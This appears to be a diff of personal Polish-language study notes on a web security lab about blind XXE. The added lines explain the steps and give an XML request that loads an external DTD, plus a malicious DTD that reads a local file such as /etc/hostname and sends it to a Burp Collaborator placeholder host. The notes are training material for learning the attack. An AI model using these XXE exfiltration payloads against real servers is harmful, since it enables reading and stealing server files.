@@ -150,9 +150,37 @@ payload:
 <br><br>
 <h2>Lab: Exploiting blind XXE to exfiltrate data using a malicious external DTD</h2>
 
-1. zmuszamy server przez xml, zeby zaczytal zasob z exploitserver.
-2. server zaczytuje stamtad zlosliwy doctype xml ze wskazanym adresem zwrotnym w collaborator
-3. server po sparsowaniu xml w exploit server wysyla zasob na collaborator
+Atak polega na zmuszeniu serwera do pobrania złośliwego DTD, który odczytuje lokalne dane i wysyła je na serwer atakującego (Collaborator).
+
+1. wysyłasz XML, który każe serwerowi pobrać zewnętrzny DTD (z exploit servera)
+2. ten DTD zawiera złośliwe encje, które:
+3. czytają lokalny plik (np. /etc/passwd) i wysyłają jego zawartość na Collaboratora
+4. serwer parsuje XML + DTD i sam wykonuje exfiltrację danych
+
+payload repeater:
+(ppm>insert collab)
+
+```
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE test [ <!ENTITY % xxe SYSTEM "https://expolit-server.net/exploit">%xxe; ]>
+<stockCheck>
+  <productId>
+6
+  </productId>
+  <storeId>
+2
+  </storeId>
+</stockCheck>
+```
+
+
+exploit server body:
+
+
+<! ENTITY % file SYSTEM "file:///etc/hostname">
+<! ENTITY % eval " <! ENTITY &#x25; exfil SYSTEM 'http://BURP-COLLABORATOR-SUBDOMAIN/?x=%file; '>">
+%eval;
+%exfil;
 
 
 
